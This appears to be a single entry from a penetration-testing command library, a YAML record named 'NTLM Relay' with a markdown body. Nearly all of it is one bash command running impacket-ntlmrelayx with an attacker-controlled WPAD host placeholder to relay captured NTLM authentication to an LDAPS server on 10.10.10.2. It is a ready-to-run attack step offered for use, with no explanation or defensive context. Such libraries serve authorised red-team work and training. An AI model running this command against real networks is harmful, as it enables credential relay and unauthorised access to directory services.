---
id: 55859d80-7ad0-4acb-9e59-81d7ef66840c
name: NTLM Relay
type: command
executor: bash
data: impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2
output: null
created_at: '2023-04-06T03:56:05.464385+00:00'
updated_at: '2023-04-10T20:25:58.237494+00:00'
---

# NTLM Relay

```bash
impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2
```


